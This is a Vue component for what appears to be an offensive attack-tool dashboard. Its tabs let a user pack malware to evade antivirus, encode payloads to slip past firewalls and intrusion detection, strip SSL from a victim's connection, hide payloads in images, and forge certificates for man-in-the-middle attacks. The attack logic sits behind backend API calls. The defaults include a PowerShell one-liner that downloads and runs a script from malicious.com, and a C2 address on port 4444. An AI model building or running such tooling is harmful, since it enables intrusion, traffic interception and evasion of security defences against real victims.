<script setup lang="ts">
import { ref } from 'vue'
import { api } from '@/api/client'
import AttackToolLayout from '@/components/AttackToolLayout.vue'
import LogTerminal from '@/components/LogTerminal.vue'

const activeTab = ref('pack')

// Logs
const terminalLogs = ref<string[]>([])

function log(msg: string) {
  const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false })
  terminalLogs.value.push(`[${timestamp}] ${msg}`)
}

const tabs = [
  { id: 'pack', label: 'MALWARE PACKING' },
  { id: 'encode', label: 'PAYLOAD ENCODING' },
  { id: 'strip', label: 'SSL STRIPPING' },
  { id: 'stego', label: 'STEGANOGRAPHY' },
  { id: 'cert', label: 'CERT SPOOFING' },
]

// Malware Pack State
const packFileName = ref('payload.exe')
const packType = ref('UPX')

async function runMalwarePack() {
  log(`> Initiating packing of ${packFileName.value} using ${packType.value}...`)
  try {
    const { data: res } = await api.post('/api/layer6/malware-pack', {
      file_name: packFileName.value,
      packer_type: packType.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] Packing failed: ${err.message}`)
  }
}

// Payload Encode State
const payloadStr = ref('Invoke-WebRequest -Uri http://malicious.com/shell.ps1 | Invoke-Expression')
const encodeType = ref('Base64')
const encodedResult = ref('')

async function runPayloadEncode() {
  log(`> Encoding payload with ${encodeType.value}...`)
  try {
    const { data: res } = await api.post('/api/layer6/payload-encode', {
      payload: payloadStr.value,
      encoding: encodeType.value
    })
    log(`[SUCCESS] ${res.message}`)
    encodedResult.value = res.encoded_output
  } catch (err: any) {
    log(`[ERROR] Encoding failed: ${err.message}`)
  }
}

// SSL Strip State
const stripTargetIp = ref('192.168.1.100')
const stripListenPort = ref(8080)

async function runSslStrip() {
  log(`> Starting SSL Stripping on ${stripTargetIp.value}:${stripListenPort.value}...`)
  try {
    const { data: res } = await api.post('/api/layer6/ssl-strip', {
      target_ip: stripTargetIp.value,
      listen_port: stripListenPort.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] SSL Strip failed: ${err.message}`)
  }
}

// Steganography State
const stegoCarrier = ref('vacation_photo.jpg')
const stegoSecret = ref('C2 Server: 10.0.0.5, Port: 4444')

async function runSteganography() {
  log(`> Injecting payload into carrier file ${stegoCarrier.value}...`)
  try {
    const { data: res } = await api.post('/api/layer6/steganography', {
      carrier_image: stegoCarrier.value,
      secret_payload: stegoSecret.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] Steganography failed: ${err.message}`)
  }
}

// Cert Spoof State
const certTargetDomain = ref('secure-login.corporate.com')
const certIssuer = ref("Let's Encrypt Authority X3")

async function runCertSpoof() {
  log(`> Forging SSL Certificate for ${certTargetDomain.value}...`)
  try {
    const { data: res } = await api.post('/api/layer6/cert-spoof', {
      target_domain: certTargetDomain.value,
      issuer: certIssuer.value
    })
    log(`[SUCCESS] ${res.message}`)
  } catch (err: any) {
    log(`[ERROR] Certificate spoofing failed: ${err.message}`)
  }
}
</script>

<template>
  <AttackToolLayout
    title="L6 TACTICAL"
    titleClass="title-l6"
    themeClass="theme-l6"
    :tabs="tabs"
    v-model:activeTab="activeTab"
  >

        <template v-if="activeTab === 'pack'">
          <h3>MALWARE PACKING & OBFUSCATION</h3>
          <p class="description">Compress and obfuscate an executable to evade signature-based Antivirus detection and reverse engineering.</p>
          <div class="form-group">
            <label>Target Executable</label>
            <input v-model="packFileName" type="text" />
          </div>
          <div class="form-group">
            <label>Packer Type</label>
            <select v-model="packType" class="dark-select">
              <option value="UPX">UPX (Ultimate Packer for Executables)</option>
              <option value="Themida">Themida</option>
              <option value="VMProtect">VMProtect</option>
              <option value="Custom_XOR">Custom XOR Stub</option>
            </select>
          </div>
          <button class="btn btn-danger" @click="runMalwarePack">PACK EXECUTABLE</button>
        </template>

        <template v-if="activeTab === 'encode'">
          <h3>PAYLOAD ENCODING</h3>
          <p class="description">Encode malicious commands to bypass Web Application Firewalls (WAF) or Intrusion Detection Systems (IDS).</p>
          <div class="form-group">
            <label>Raw Payload</label>
            <textarea v-model="payloadStr" rows="4" class="dark-textarea"></textarea>
          </div>
          <div class="form-group">
            <label>Encoding Method</label>
            <select v-model="encodeType" class="dark-select">
              <option value="Base64">Base64</option>
              <option value="XOR">XOR Encrypted</option>
              <option value="Hex">Hexadecimal</option>
              <option value="URL">URL Encoding</option>
            </select>
          </div>
          <button class="btn btn-primary" @click="runPayloadEncode">ENCODE PAYLOAD</button>

          <div v-if="encodedResult" class="result-box">
            <label>Encoded Output:</label>
            <div class="encoded-text">{{ encodedResult }}</div>
          </div>
        </template>

        <template v-if="activeTab === 'strip'">
          <h3>SSL/TLS STRIPPING</h3>
          <p class="description">Downgrade a victim's connection from secure HTTPS to plaintext HTTP to intercept sensitive data.</p>
          <div class="form-group">
            <label>Target IP</label>
            <input v-model="stripTargetIp" type="text" />
          </div>
          <div class="form-group">
            <label>Listen Port</label>
            <input v-model.number="stripListenPort" type="number" />
          </div>
          <button class="btn btn-danger" @click="runSslStrip">ENGAGE SSL STRIPPING</button>
        </template>

        <template v-if="activeTab === 'stego'">
          <h3>STEGANOGRAPHY</h3>
          <p class="description">Hide malicious payloads or configuration data inside benign files (e.g., images) to evade detection.</p>
          <div class="form-group">
            <label>Carrier File (Image/Audio)</label>
            <input v-model="stegoCarrier" type="text" />
          </div>
          <div class="form-group">
            <label>Secret Payload / Data</label>
            <textarea v-model="stegoSecret" rows="3" class="dark-textarea"></textarea>
          </div>
          <button class="btn btn-danger" @click="runSteganography">EMBED PAYLOAD</button>
        </template>

        <template v-if="activeTab === 'cert'">
          <h3>CERTIFICATE SPOOFING</h3>
          <p class="description">Generate fake X.509 certificates to perform deep-packet inspection and MitM attacks on TLS connections.</p>
          <div class="form-group">
            <label>Target Domain to Spoof</label>
            <input v-model="certTargetDomain" type="text" />
          </div>
          <div class="form-group">
            <label>Fake Issuer Authority</label>
            <input v-model="certIssuer" type="text" />
          </div>
          <button class="btn btn-danger" @click="runCertSpoof">FORGE CERTIFICATE</button>
        </template>
    <template #terminal>
      <LogTerminal :logs="terminalLogs" />
    </template>
  </AttackToolLayout>
</template>
